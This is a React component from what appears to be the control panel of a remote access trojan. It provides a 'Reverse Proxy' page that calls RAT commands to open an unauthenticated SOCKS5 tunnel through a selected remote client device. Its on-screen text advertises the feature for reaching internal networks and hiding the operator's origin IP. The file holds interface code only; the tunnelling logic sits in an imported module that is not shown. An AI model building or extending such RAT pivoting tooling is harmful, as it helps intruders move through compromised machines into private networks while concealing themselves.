import { useState } from "react";
import { useParams } from "react-router-dom";
import { startReverseProxyCmd, stopReverseProxyCmd } from "../rat/RATCommands";
import {
  IconDeviceDesktop,
  IconInfoCircle,
  IconNetwork,
  IconServer,
} from "@tabler/icons-react";

export const ReverseProxy = () => {
  const { addr } = useParams();
  const [port, setPort] = useState("9876");
  const [localPort, setLocalPort] = useState("2345");
  const [running, setRunning] = useState(false);
  const [connectionStatus, setConnectionStatus] =
    useState<string>("Ready to connect");

  async function startReverseProxy() {
    try {
      setConnectionStatus("Connecting...");
      await startReverseProxyCmd(addr, port, localPort);
      setRunning(true);
      setConnectionStatus("Connected");
    } catch (error) {
      console.error("Error starting reverse proxy:", error);
      setConnectionStatus("Connection failed");
    }
  }

  async function stopReverseProxy() {
    try {
      await stopReverseProxyCmd(addr);
      setRunning(false);
      setConnectionStatus("Ready to connect");
    } catch (error) {
      console.error("Error stopping reverse proxy:", error);
    }
  }

  if (!addr) {
    return (
      <div className="p-6 flex flex-col items-center justify-center h-full">
        <h1 className="text-2xl font-bold mb-4">Reverse Proxy</h1>
        <p>No client selected. Please select a client from the clients list.</p>
      </div>
    );
  }

  return (
    <div className="p-6 w-full h-screen bg-primarybg flex flex-col">
      <div className="flex justify-between items-center mb-6">
        <div className="flex items-center gap-2">
          <IconNetwork size={28} className="text-accenttext" />
          <h2 className="text-xl font-medium text-white">Reverse Proxy</h2>
        </div>

        <div className="flex items-center gap-2">
          <span
            className={`text-sm px-4 py-1.5 rounded-md font-medium ${
              connectionStatus === "Connected"
                ? "bg-green-500 text-white"
                : connectionStatus === "Connecting..."
                ? "bg-yellow-500 text-black"
                : connectionStatus === "Connection failed"
                ? "bg-red-500 text-white"
                : "bg-gray-700 text-white"
            }`}
          >
            {connectionStatus}
          </span>
        </div>
      </div>

      <div className="bg-secondarybg bg-opacity-80 rounded-xl shadow-lg p-6 w-full max-w-4xl mx-auto">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
          <div className="bg-primarybg bg-opacity-70 rounded-lg px-4 py-3 border border-accentx">
            <div className="flex items-center mb-2">
              <IconServer size={20} className="text-accenttext mr-2" />
              <h3 className="text-base text-white">Local Settings</h3>
            </div>
            <div className="text-sm text-gray-300 mb-4">
              Configure the local port where your SOCKS5 proxy will listen
            </div>
            <div className="flex items-center gap-3">
              <label className="text-sm text-accenttext">Local Port:</label>
              <input
                type="text"
                className="block w-32 py-2 px-3 text-sm bg-secondarybg rounded-md border border-gray-500 focus:outline-none focus:border-accentx text-white"
                placeholder="2345"
                value={localPort}
                onChange={(e) => setLocalPort(e.target.value)}
              />
            </div>
          </div>

          <div className="bg-primarybg bg-opacity-70 rounded-lg px-4 py-3 border border-accentx">
            <div className="flex items-center mb-2">
              <IconDeviceDesktop size={20} className="text-accenttext mr-2" />
              <h3 className="text-base text-white">Remote Settings</h3>
            </div>
            <div className="text-sm text-gray-300 mb-4">
              Configure the port on the remote device to establish the
              connection
            </div>
            <div className="flex items-center gap-3">
              <label className="text-sm text-accenttext">Remote Port:</label>
              <input
                type="text"
                className="block w-32 py-2 px-3 text-sm bg-secondarybg rounded-md border border-gray-700 focus:outline-none focus:border-accentx text-white"
                placeholder="9876"
                value={port}
                onChange={(e) => setPort(e.target.value)}
              />
            </div>
          </div>
        </div>

        <div className="flex justify-center mb-6">
          <button
            className={`px-6 py-3 rounded-lg border text-base transition-all duration-200 flex items-center justify-center font-medium cursor-pointer ${
              !running
                ? "border-green-500 bg-green-500 bg-opacity-40 text-white hover:bg-opacity-60 w-48"
                : "border-red-500 bg-red-500 bg-opacity-40 text-white hover:bg-opacity-60 w-48"
            }`}
            onClick={running ? stopReverseProxy : startReverseProxy}
          >
            {!running ? "Start Proxy" : "Stop Proxy"}
          </button>
        </div>

        <div className="bg-primarybg border border-accentx rounded-lg p-4 flex items-start gap-3">
          <IconInfoCircle
            size={22}
            className="text-accenttext shrink-0 mt-0.5"
          />
          <div>
            <h4 className="text-white font-medium mb-1">
              Connection Information
            </h4>
            <p className="text-sm text-gray-300">
              Use these settings in your applications to connect through the
              proxy:
            </p>
            <ul className="mt-2 space-y-1 text-sm text-white">
              <li>
                <span className="text-accenttext">Proxy Type:</span> SOCKS5
              </li>
              <li>
                <span className="text-accenttext">Address:</span> 127.0.0.1
              </li>
              <li>
                <span className="text-accenttext">Port:</span> {localPort}
              </li>
              <li>
                <span className="text-accenttext">Authentication:</span> None
                required
              </li>
            </ul>
          </div>
        </div>
      </div>

      <div className="mt-auto pt-4">
        <div className="bg-secondarybg bg-opacity-70 rounded-lg px-4 py-3 border border-accentx flex items-center gap-3 max-w-4xl mx-auto">
          <IconInfoCircle size={18} className="text-accenttext shrink-0" />
          <p className="text-sm text-gray-300">
            This SOCKS5 proxy allows you to redirect network traffic through the
            remote device. Perfect for accessing internal networks, bypassing
            regional restrictions, or hiding your origin IP.
          </p>
        </div>
      </div>
    </div>
  );
};
